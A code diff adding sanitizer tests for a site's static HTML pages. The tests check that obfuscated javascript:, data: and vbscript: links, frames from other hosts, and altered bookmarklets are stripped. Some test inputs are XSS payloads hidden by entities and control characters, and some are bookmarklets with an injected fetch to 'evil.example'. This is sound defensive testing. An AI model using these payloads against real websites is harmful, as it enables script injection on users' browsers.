@@ -1,7 +1,7 @@
 import { describe, expect, it } from "vitest";
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
-import { sanitizeStaticHtml } from "./sanitize";
+import { DOCS_SANDBOX, LINKER_BOOKMARKLET, sanitizeStaticHtml } from "./sanitize";
 
 const fixture = (name: string) => JSON.parse(readFileSync(join(__dirname, "..", "..", "..", "e2e", "fixtures", "static-pages", `${name}.json`), "utf8")) as { html: string };
 const clean = (html: string, page = "terms", siteOrigin = "") => sanitizeStaticHtml(html, { page, siteOrigin }).html;
@@ -19,8 +19,20 @@ describe("sanitizeStaticHtml: the static page's content block", () => {
     expect(out).toBe('<p>a<a>j</a><a>d</a><img src="x"></p><p></p>');
   });
 
+  it("a scheme hidden by entities, tabs, newlines or control characters is still seen and dropped", () => {
+    for (const href of ["java&#9;script:alert(1)", "jav&#x0A;ascript:alert(1)", "&#1;javascript:alert(1)", " &#x20;javascript:alert(1)", "JaVaScRiPt:alert(1)", "java&Tab;script:alert(1)", "da&#9;ta:text/html,x", "vb&#13;script:x", "\\\\evil.example/x"]) {
+      expect(clean(`<a href="${href}">x</a>`), href).toBe("<a>x</a>");
+      expect(clean(`<img src="${href}">`), href).toBe("<img>");
+    }
+    // ...also on the Linker page (only its exact bookmarklet passes there)
+    expect(clean('<a href="java&#9;script:alert(1)">x</a>', "linker")).toBe("<a>x</a>");
+    const fine = '<a href="https://www.sefaria.org/texts">t</a><a href="mailto:a@b.org">m</a><a href="tel:+1">p</a><a href="/about#x">a</a>';
+    expect(clean(fine)).toBe(fine);
+  });
+
   it("frames only from the hosts the pages embed (Google Docs, YouTube), over https", () => {
-    expect(clean('<iframe src="https://docs.google.com/document/d/e/x/pub?embedded=true"></iframe>')).toBe('<iframe src="https://docs.google.com/document/d/e/x/pub?embedded=true"></iframe>');
+    // Google's documents are sandboxed (their scripts, their own origin, links opening new windows)
+    expect(clean('<iframe src="https://docs.google.com/document/d/e/x/pub?embedded=true"></iframe>')).toBe(`<iframe src="https://docs.google.com/document/d/e/x/pub?embedded=true" sandbox="${DOCS_SANDBOX}"></iframe>`);
     expect(clean('<iframe src="https://www.youtube-nocookie.com/embed/5PmBolxgXBY" allowfullscreen></iframe>')).toContain("youtube-nocookie");
     expect(clean('<iframe src="https://evil.example/x"><p>inside</p></iframe><p>after</p>')).toBe("<p>after</p>");
     expect(clean('<iframe src="http://www.youtube.com/embed/x"></iframe>')).toBe("");
@@ -44,6 +56,7 @@ describe("sanitizeStaticHtml: the static page's content block", () => {
     expect(out.match(/class="selected"/g)).toHaveLength(1);
     expect(out).not.toContain("<script");
     expect(out).toContain('<iframe src="https://docs.google.com/document/d/e/');
+    expect(out).toContain(`sandbox="${DOCS_SANDBOX}"`);
   });
 
   it("mobile-about-menu: no item of its own (the old script threw there): nothing selected; its stylesheet link is lifted out", () => {
@@ -57,6 +70,8 @@ describe("sanitizeStaticHtml: the static page's content block", () => {
   it("the Linker page keeps its bookmarklet (it only loads the site's linker.js); nowhere else", () => {
     const html = fixture("linker.en").html;
     expect(clean(html, "linker")).toMatch(/href="javascript: \(function \(\) \{[^"]*https:\/\/www\.sefaria\.org\/linker\.js/);
+    // exactly the template's bookmarklet: anything added to it (even loading the same script) is dropped
+    expect(clean(`<a href="${LINKER_BOOKMARKLET.replace("}());", "fetch('https://evil.example'); }());")}">x</a>`, "linker")).toBe("<a>x</a>");
     expect(clean(html, "terms")).not.toContain("javascript:");
     expect(clean(`<a href="javascript:(function(){fetch('https://evil.example')}());">x</a>`, "linker")).toBe("<a>x</a>");
   });
